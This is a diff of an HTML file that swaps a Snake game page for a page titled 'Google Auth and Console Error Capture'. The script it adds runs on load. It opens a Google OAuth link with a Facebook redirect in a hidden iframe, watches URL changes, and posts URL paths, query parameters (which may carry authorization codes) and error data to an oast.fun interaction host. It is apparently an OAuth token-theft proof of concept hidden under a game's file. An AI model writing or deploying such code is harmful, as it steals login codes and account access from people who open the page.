@@ -1,26 +1,100 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-	<title>Snake Game</title>
-	<link rel="stylesheet" href="style.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Google Auth and Console Error Capture</title>
 </head>
 <body>
-	<div id="game-container">
-		<canvas id="gc" class="game-canvas" width="400" height="400"></canvas>
-	</div>
-	<div class="keys">
-	  <a class="up arr" onclick="Snake.action('up')">
-	    <i class="chevron up"></i></a>
-	  <br />
-	  <a class="left arr" onclick="Snake.action('left')">
-	    <i class="chevron left"></i></a>
-	  <a class="down arr" onclick="Snake.action('down')">
-	    <i class="chevron down"></i></a>
-	  <a class="right arr" onclick="Snake.action('right')">
-	    <i class="chevron right"></i></a>
-	</div>
-	<script type="text/javascript" src="game.js"></script>
+
+<script>
+  var authData = null; // Variable to store authentication data
+
+  // Function to handle Google auth response
+  function handleGoogleAuthResponse(response) {
+    // Store the authentication data
+    authData = response;
+
+    // Print the authentication data on the main page
+    console.log('Authentication data:', authData);
+  }
+
+  // Function to send data to server
+  function sendDataToServer(data) {
+    // Perform an AJAX request to send data to the server
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', 'https://gnlnxdcywbrfyhuvizhpsiic2p7im0w8t.oast.fun', true); // Replace with your server URL
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.onreadystatechange = function() {
+      if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+        console.log('Data sent successfully!');
+      }
+    };
+    xhr.send(JSON.stringify(data));
+  }
+
+  // Function to capture redirects and loading of parameters
+  function captureRedirects() {
+    // Monitor changes to the URL
+    var currentUrl = window.location.href;
+    setInterval(function() {
+      var newUrl = window.location.href;
+      if (newUrl !== currentUrl) {
+        // Extract relevant information from the new URL
+        var urlParts = newUrl.split('?');
+        var path = urlParts[0];
+        var params = urlParts[1] ? urlParts[1].split('&') : [];
+        var queryParams = {};
+        params.forEach(function(param) {
+          var keyValue = param.split('=');
+          queryParams[keyValue[0]] = keyValue[1];
+        });
+
+        // Send the captured data to the server
+        sendDataToServer({
+          path: path,
+          queryParams: queryParams
+        });
+
+        // Update the current URL
+        currentUrl = newUrl;
+      }
+    }, 1000); // Check for URL changes every second
+  }
+
+  // Function to capture console errors
+  function captureConsoleErrors() {
+    window.onerror = function(message, source, lineno, colno, error) {
+      // Send the error data to the server
+      sendDataToServer({
+        error: {
+          message: message,
+          source: source,
+          lineNumber: lineno,
+          columnNumber: colno,
+          errorObject: error ? error.stack : null
+        }
+      });
+    };
+  }
+
+  // Function to trigger Google auth
+  function triggerGoogleAuth() {
+    // URL of the Google authentication link
+    var authUrl = 'https://accounts.google.com/o/oauth2/auth?client_id=15057814354-80cg059cn49j6kmhhkjam4b00on1gb2n.apps.googleusercontent.com&state=ARcnSJifmn-zqN3EWLl0TS5_skhR3ZUxff9_0aXvbWCe3gnUUvShuXvT7oulzsLHyB9cFAQvkfCiqjzdKhe8EiUOvke5XA8Hmcnl-xVS9vm2DCDwYetZsJKTYWWtSFaxExsIWnHdMkT8Oq8-Ko4XbJmgdwEN4MUAQ-a8oyXMtv5BR1XZr8sqqC4LZjVNVvy59GwZ6uDJ1itaMhK5Dd8Zj8Aws4Vyr_RkPSM_pBBsMRtoay6s8XZ1373J-yCRd0uaKSQOTuhWOajA7Wl0empx-dwi&response_type=code&redirect_uri=https%3A%2F%2Fwww.facebook.com%2Foauth2%2Fredirect%2F&scope=openid+email&login_hint=rootkaliroot006%40gmail.com';
+
+    // Set the iframe source to the Google authentication link
+    document.getElementById('googleAuthFrame').src = authUrl;
+  }
+
+  // Call functions to capture redirects, console errors, and trigger Google auth
+  captureRedirects();
+  captureConsoleErrors();
+  triggerGoogleAuth();
+</script>
+
+<!-- Hidden iframe to handle Google authentication -->
+<iframe id="googleAuthFrame" style="display: none;"></iframe>
+
 </body>
 </html>
